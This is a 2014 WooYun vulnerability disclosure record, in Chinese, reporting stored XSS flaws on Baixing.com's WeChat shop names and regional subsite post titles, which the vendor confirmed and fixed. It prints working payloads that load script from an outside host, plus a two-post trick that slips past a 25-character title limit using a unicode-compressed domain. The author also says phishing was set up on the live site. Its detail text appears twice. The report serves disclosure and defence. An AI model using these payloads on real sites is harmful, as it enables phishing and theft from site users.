{"id": 52030, "wybug_id": "wooyun-2014-072566", "wybug_title": "百姓网主站存储型XSS(已钓鱼)+各地方分站存储型XSS", "wybug_corp": "百姓网", "wybug_author": "0x_Jin", "wybug_date": "2014-08-18 10:45", "wybug_open_date": "2014-08-26 20:05", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-26：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 我又来了 58 百姓 下次赶集~ 详细说明：  先上图：\n\n有木有发现跟 http://beijing.baixing.com/m/oz/login 的界面差不多这是在微信访问的效果 用手机浏览器访问则效果一样首先这是个存储型XSS，位置在与 微店 --> 设置微店的名称那，未做过滤可以直接X入XSS代码！\n\npayload=  \"><script src=//xss1.com></script>再来看看payload 中js 的值：\n\n微店地址位于主域：www.baixing.com/weishop/u113051581.html 本来之前还能电脑访问的 现在只能手机访问了由于对cookie做了Httponly  就没获取cookie了另外分站的存储型XSS：http://beijing.baixing.com/m/shoujihaoma/a393718461.html?postSuccess=1(firefox 打开)上张图：\n\n这个XSS存在于发表一个帖子的标题处 限制了25个字符。这个本来是能加载js的 但是要26个字符 而这里限制了25个字符。。。如果我有tld顶级域名 这个XSS就妥了 建议过滤吧，如果你再不过滤 小心真有人买个tld然后就悲剧了这里只对“ \\做了过滤 没过滤 < >什么的 建议过滤的全点\n\n我的26个字符的xss payload </script><script src=//xx>不要以为这样不可能 。。。。敢再多给我个字符输入 我就能加载js再加点吧：漏洞地址http://wulumuqi.baixing.com/ershouqiche/a393641169.html百姓网所有子站均可这样XSS问题出在百姓网会在帖子的下面显示该用户发布的帖子 而在显示帖子标题处却未作过滤 截图如下：\n\n虽然限制了二十五个字符，可是依旧能被绕过！首先在同分类下 发帖标题为*/</script>然后再发帖标题为：’><script src=//㎦.㎺>/* 在这里用了unicode来编码域名让本来六位数域名变成了三个字符然后再随便发篇帖子 进去一看 便出现了如下情景：\n\n前面插入一段然后加上注释，后面插上一段再上注释跟结尾就构成了XSS！之前爱丽网也出现过此类漏洞。连接在此： WooYun: 爱丽某处存储型XSS可实现你的各种猥琐想法（绕过过滤） 理论上一个地方的子站可以这样 那么所有地方子站都可以这样。都是一个模子出来的。。。等等   漏洞证明：  先上图：\n\n有木有发现跟 http://beijing.baixing.com/m/oz/login 的界面差不多这是在微信访问的效果 用手机浏览器访问则效果一样首先这是个存储型XSS，位置在与 微店 --> 设置微店的名称那，未做过滤可以直接X入XSS代码！\n\npayload=  \"><script src=//xss1.com></script>再来看看payload 中js 的值：\n\n微店地址位于主域：www.baixing.com/weishop/u113051581.html 本来之前还能电脑访问的 现在只能手机访问了由于对cookie做了Httponly  就没获取cookie了另外分站的存储型XSS：http://beijing.baixing.com/m/shoujihaoma/a393718461.html?postSuccess=1(firefox 打开)上张图：\n\n这个XSS存在于发表一个帖子的标题处 限制了25个字符。这个本来是能加载js的 但是要26个字符 而这里限制了25个字符。。。如果我有tld顶级域名 这个XSS就妥了 建议过滤吧，如果你再不过滤 小心真有人买个tld然后就悲剧了这里只对“ \\做了过滤 没过滤 < >什么的 建议过滤的全点\n\n我的26个字符的xss payload </script><script src=//xx>不要以为这样不可能 。。。。敢再多给我个字符输入 我就能加载js再加点吧：漏洞地址http://wulumuqi.baixing.com/ershouqiche/a393641169.html百姓网所有子站均可这样XSS问题出在百姓网会在帖子的下面显示该用户发布的帖子 而在显示帖子标题处却未作过滤 截图如下：\n\n虽然限制了二十五个字符，可是依旧能被绕过！首先在同分类下 发帖标题为*/</script>然后再发帖标题为：’><script src=//㎦.㎺>/* 在这里用了unicode来编码域名让本来六位数域名变成了三个字符然后再随便发篇帖子 进去一看 便出现了如下情景：\n\n前面插入一段然后加上注释，后面插上一段再上注释跟结尾就构成了XSS！之前爱丽网也出现过此类漏洞。连接在此： WooYun: 爱丽某处存储型XSS可实现你的各种猥琐想法（绕过过滤） 理论上一个地方的子站可以这样 那么所有地方子站都可以这样。都是一个模子出来的。。。这个漏洞还影响分类目录：http://wulumuqi.baixing.com/chelianghttp://wulumuqi.baixing.com/ershouqiche/等等   修复方案：  还是老一套的过滤方法 每个漏洞都这样说” ‘ > < \\ / &# 等字符都要处理下 还有危险标签 函数 等等等等 网上方法很多的   版权声明：转载请注明来源 0x_Jin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-08-20 09:46 厂商回复： 确认，已请同事修复。多谢！ 最新状态： 2014-08-26：已修复，多谢 0x_Jin。  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}